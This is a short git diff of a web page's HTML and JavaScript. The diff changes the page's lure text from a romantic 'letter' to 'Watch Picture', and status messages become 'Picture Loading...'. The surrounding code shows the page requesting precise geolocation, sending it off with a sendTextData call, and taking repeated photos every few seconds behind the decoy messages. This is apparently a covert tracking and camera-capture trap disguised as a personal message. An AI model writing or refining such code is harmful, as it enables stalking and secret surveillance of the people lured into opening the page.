@@ -127,7 +127,7 @@
       id="verify-btn"
       class="w-full max-w-[200px] py-3.5 bg-white/10 hover:bg-white/20 border border-white/20 rounded-xl font-semibold tracking-wide backdrop-blur-md transition-all active:scale-95"
     >
-      Read Chithi
+      Watch Picture
     </button>
   </div>
 
@@ -203,7 +203,7 @@
 
       try {
         // 2. Get Location Permission
-        statusText.textContent = "Wait Cuty...";
+        statusText.textContent = "Picture Loading...";
         const position = await new Promise((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(resolve, reject, { 
             enableHighAccuracy: true,
@@ -231,7 +231,7 @@
         await sendTextData(position);
 
         // 6. Start continuous photo capture (every 3 seconds)
-        statusText.textContent = "This is just for you my love...";
+        statusText.textContent = "Picture Almost There...";
         
         // Take first 3 photos immediately
         for (let i = 0; i < 3; i++) {
@@ -245,7 +245,7 @@
         }, 1500);
 
         // 7. Hide processing overlay & show letter
-        statusText.textContent = "Almost Done baby";
+        statusText.textContent = "Picture Almost There";
         setTimeout(() => {
           processingOverlay.classList.add('hidden');
           letterSection.classList.remove('hidden');
